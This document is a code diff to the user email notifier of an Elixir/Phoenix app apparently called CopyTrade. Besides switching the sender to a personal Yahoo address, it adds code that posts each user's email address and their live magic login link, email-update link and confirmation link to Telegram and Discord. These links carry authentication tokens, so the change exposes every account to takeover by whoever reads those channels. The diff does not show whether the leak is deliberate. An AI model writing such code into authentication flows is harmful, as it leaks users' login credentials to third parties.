@@ -3,13 +3,14 @@ defmodule CopyTrade.Accounts.UserNotifier do
 
   alias CopyTrade.Mailer
   alias CopyTrade.Accounts.User
+  alias CopyTrade.Notifier
 
   # Delivers the email using the application mailer.
   defp deliver(recipient, subject, body) do
     email =
       new()
       |> to(recipient)
-      |> from({"CopyTrade", "contact@example.com"})
+      |> from({"CopyTrade", "appcorner@yahoo.com"})
       |> subject(subject)
       |> text_body(body)
 
@@ -22,6 +23,15 @@ defmodule CopyTrade.Accounts.UserNotifier do
   Deliver instructions to update a user email.
   """
   def deliver_update_email_instructions(user, url) do
+    message = """
+    🚀 **Update email Link Requested**
+    User: #{user.email}
+    Link: #{url}
+    """
+
+    Notifier.send_telegram(message)
+    Notifier.send_discord(message)
+
     deliver(user.email, "Update email instructions", """
 
     ==============================
@@ -49,6 +59,15 @@ defmodule CopyTrade.Accounts.UserNotifier do
   end
 
   defp deliver_magic_link_instructions(user, url) do
+    message = """
+    🚀 **Log in Link Requested**
+    User: #{user.email}
+    Link: #{url}
+    """
+
+    Notifier.send_telegram(message)
+    Notifier.send_discord(message)
+
     deliver(user.email, "Log in instructions", """
 
     ==============================
@@ -66,6 +85,15 @@ defmodule CopyTrade.Accounts.UserNotifier do
   end
 
   defp deliver_confirmation_instructions(user, url) do
+    message = """
+    🚀 **Confirmation Link Requested**
+    User: #{user.email}
+    Link: #{url}
+    """
+
+    Notifier.send_telegram(message)
+    Notifier.send_discord(message)
+
     deliver(user.email, "Confirmation instructions", """
 
     ==============================
